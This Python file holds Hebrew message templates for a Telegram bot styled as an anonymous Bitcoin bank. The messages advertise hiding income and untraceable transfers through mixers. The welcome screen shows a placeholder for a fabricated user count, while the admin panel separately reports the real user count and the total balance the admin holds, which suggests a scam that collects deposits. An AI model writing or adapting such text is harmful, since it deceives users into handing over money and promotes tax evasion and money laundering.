
start_msg = """
<b>ברוך הבא</b>

אתה נמצא בבוט תשלום אנונימי.
רוצה להסתיר הכנסה? או לשלוח כסף ללא עקבות?
בוט זה מאפשר לך לבצע תשלומים מיידיים לכל מקום בעולם, מוצפן בהצפנה כפולה.
ניתן לשנות את מספר הארנק בכל עת.

💳 <b>יתרה:</b> <code>{balance}</code>$
🏦 <b>כתובת הארנק:</b> <code>{wallet_id}</code>
מילוי ומשיכה בחשבון - בביטקוין בלבד.

<b>כבר איתנו:</b> {fake_peoples_num} אנשים

"""

add_money_msg = """
<b>מילוי יתרה</b>

💳 היתרה הנוכחית שלך: {balance}$

<b>שלח את הסכום הרצוי לארנק הביטקוין הבא:</b>
<code>{btc_address}</code>

<b>שימו לב!</b>
מטעמי אבטחה, עם כל מילוי יתרה משתנה הכתובת של ארנק הביטקוין למילוי החשבון.
בשום מקרה אל תגדיר תשלום אוטומטי עבור אף אחת מהכתובות, אחרת אתה מסתכן בהפסד ההשקעה שלך.
"""

payment_done_msg = """
<b>התשלום הושלם בהצלחה</b>

התשלום שלך התקבל והכסף זוכה.
אתה יכול לשלוח את הפקודה /start לבוט ולוודא שהכמות שנוספה לחשבונך הינה נכונה
"""

send_money_amount_msg = """
<b>שליחת כסף</b>

⚠️ הזן את הסכום המועדף עליך להעברה.

תשומת הלב!
בשל המספר הגדול של מיקסרים בשימוש והפניות לארנקים שונים (הרי כך המערכת משבשת נתונים), עמלת הרשת היא 4-6%.
זכור זאת בעת הזנת הסכום להעברה

"""

send_money_address_msg = """
<b>שליחת כסף</b>

⚠️ ציין את הכתובת של חשבון אנונימבנק שאליו ברצונך לשלוח את הכסף הזה.

תשומת הלב!
העברה אפשרית רק בין חשבונות אנונימבנק.

"""

error_only_num_msg = """
<b>שגיאה</b>

רק מספרים מותרים בשלב זה.
"""


error_big_num_msg = """
<b>שגיאה</b>

אתה מנסה לשלוח יותר ממה שיש לך בפועל
"""


money_sended_msg = """
<b>הכסף נשלח בהצלחה</b>

הכסף נשלח בהצלחה, ובתוך מספר שניות הוא יופיע בחשבון הנמען.

שלח את הפקודה /start לבוט כדי לחזור לתפריט הראשי
"""

error_only_wallet_msg = """
<b>שגיאה</b>

פורמט כתובת נמען לא חוקי

"""

insert_output_withrow_mount_msg = """
<b>משיכות</b>

⚠️ ציין את הסכום למשיכה (בדולרים)

"""


value_to_withrow_msg = """
<b>משיכות</b>

⚠️ ציין את הכתובת של ארנק הביטקוין למשיכה
"""

money_withrow_sended_msg = """
<b>משיכות</b>

הכסף נשלח לארנק הביטקוין שצוין.

<b>קוד עסקה:</b>
<code>{tr_id}</code>
"""

message_id_changed_msg = "מזהה הארנק השתנה בהצלחה"


admin_panel_msg = """
<b>לוח ניהול</b>

יתרה כוללת: {total_admin_balance}$
מספר אמיתי של משתמשים: {subs_num}

"""


#### BUTTONS ####
send_money_btn = "💸 שליחה"
add_money_btn = "📥 הפקדה"
withrow_btn = "📤 משיכה"
change_wallet_id_btn = "🛡️ החלפת מזהה ארנק"